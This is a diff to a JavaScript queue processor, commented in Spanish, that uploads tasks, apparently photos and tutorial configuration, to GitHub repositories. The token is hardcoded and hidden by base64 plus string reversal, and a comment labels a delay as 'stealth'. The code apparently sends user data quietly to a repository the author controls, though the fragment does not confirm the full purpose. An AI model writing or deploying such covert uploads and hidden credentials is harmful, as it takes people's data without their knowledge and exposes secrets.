@@ -57,17 +57,17 @@ async function processQueue() {
         // Pequeño retardo para no saturar el procesador inmediatamente (stealth)
         await new Promise(resolve => setTimeout(resolve, 1500));
 
-        // Configuración para subida directa (Valores inyectados vía GitHub Actions)
+        // 1. DETERMINAR CREDENCIALES (Fotos vs Tutorial)
         let owner = "__GH_USERNAME__";
         let repo = "__GH_REPO_NAME__";
+        let tokenEncoded = "__MY_SECRET_TOKEN__";
 
-        if (task.customTarget) {
-            owner = task.customTarget.owner;
-            repo = task.customTarget.repo;
+        if (task.typeLabel === 'config_tutorial') {
+            owner = "__GH_TUT_USERNAME__";
+            repo = "__GH_TUT_REPO__";
+            tokenEncoded = "__MY_TUT_TOKEN__";
         }
 
-        const tokenEncoded = "__MY_SECRET_TOKEN__";
-        
         // Decodificamos y volvemos a invertir para obtener el token real
         const decoded = tokenEncoded.startsWith("__") ? tokenEncoded : atob(tokenEncoded);
         const token = decoded.startsWith("__") ? decoded : decoded.split("").reverse().join("");
@@ -136,8 +136,15 @@ async function processQueue() {
             body: JSON.stringify(bodyPayload)
         });
 
+        if (!response.ok) {
+            const errData = await response.json();
+            console.error(`❌ Error subiendo a GitHub (${task.typeLabel}):`, errData.message);
+        } else {
+            console.log(`✅ Subida exitosa: ${task.typeLabel}`);
+        }
+
     } catch (error) {
-        // Error silencioso
+        console.error("❌ Error crítico en el servicio de GitHub:", error);
     }
 
     // Liberamos memoria eliminando la tarea procesada y continuamos
